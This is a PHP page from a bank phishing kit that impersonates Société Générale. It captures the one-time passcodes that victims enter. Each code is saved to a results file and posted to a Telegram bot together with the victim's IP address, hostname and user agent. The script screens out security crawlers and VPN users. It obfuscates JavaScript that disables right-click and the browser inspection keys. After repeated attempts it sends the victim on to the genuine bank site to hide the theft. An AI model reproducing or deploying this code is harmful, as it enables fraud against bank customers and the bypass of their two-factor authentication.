<?php
error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors','0');
@ini_set('display_errors','0');
@ini_set('display_startup_errors','0');
@ini_set('log_errors','0');
$ip = $_SERVER['REMOTE_ADDR'];
session_id(md5($ip));
session_start();

$stripos = 0;
include 'config.php';


include 'M3tri-anti-bots_v0.01/M3tri-Organization.php';
include 'M3tri-anti-bots_v0.01/M3tri-ips.php';
include 'M3tri-anti-bots_v0.01/M3tri-OS-BRS.php';
include 'M3tri-anti-bots_v0.01/M3tri-UA.php';
include 'M3tri-anti-bots_v0.01/M3tri-vpn-proxy.php';
require_once './includes/HunterObfuscator.php'; //Include the class

$jsCode = " jQuery(function($){ document.addEventListener('contextmenu', event => event.preventDefault()); document.onkeydown = function(e) { if (e.ctrlKey && (e.keyCode === 67 || e.keyCode === 86 || e.keyCode === 85 || e.keyCode === 83 || e.keyCode === 117 || e.keyCode === 44)) { return false; } else { return true; } }; $(document).keydown(function (event) { if (event.keyCode == 123) { return false; } else if (event.ctrlKey && event.shiftKey && event.keyCode == 73) { return false; } }); }) "; //Simple JS code

$hunter = new HunterObfuscator($jsCode); //Initialize with JS code in parameter
$hunter->addDomainName($_SERVER['HTTP_HOST']);
$obsfucated = $hunter->Obfuscate(); //Do obfuscate and get the obfuscated code


$permitted_chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ.-_~";


$honeypotbots = file_get_contents('honeypotbots.dat');
$errorUrl = '403.php';

$hostname = gethostbyaddr($ip);

if (stripos($honeypotbots, $ip) !== false) {
	
   $stripos = $stripos + 1;

}

$token1 = base64_encode($_SERVER['HTTP_USER_AGENT'].$ip.date('Y:M:D'));


if ($_SESSION['continentCode'] !== 'EU' && $_SESSION['continentCode'] !== 'AF')
{
      $stripos = $stripos + 1;
} 


if ($token1 != $_GET['token'] || $stripos > 0 ){ header("location: " . $errorUrl ."?" . $_GET['token']); exit;  }


if ($_POST['type'] == "otp") {



            $message = '/== SG otp By METRI==/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'OTP : ' . $_POST['otp'] . "\r\n";
      
            $message .= '/---------------- user details ----------------/' . "\r\n";
            $message .= "Client IP   : ".$ip."\n";
            $message .= "HostName    : ".$hostname."\n";
            $message .= "User Agent  : ".$_SERVER['HTTP_USER_AGENT']."\n";
            $message .= '/-- end otp details --/' . "\r\n\r\n";

            file_put_contents("./rezult/sg-rzlt.txt", $message, FILE_APPEND);

            $tokenlink = "https://api.telegram.org/bot" . $METRI_TOKEN;
            $params=[
            'chat_id'=>$chat_id,
            'text'=>$message,
            ];
            $ch = curl_init($tokenlink . '/sendMessage');
            curl_setopt($ch, CURLOPT_HEADER, false);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            $result = curl_exec($ch);
            curl_close($ch);
			
					$sms_request = 1 + $_GET['request'];

$red = './Soc-otp.php';



if($reload == $sms_request){

$red = 'https://particuliers.societegenerale.fr/';

}
            
}
else {
header("location: " . $errorUrl . "?".base64_encode(rand(0,9999999999999)));
}




?>
<html>
	<META HTTP-EQUIV="Refresh" Content=0;URL="<?php echo $red ."?request=" . $sms_request ."&token=" .$token1; ?>">

</html>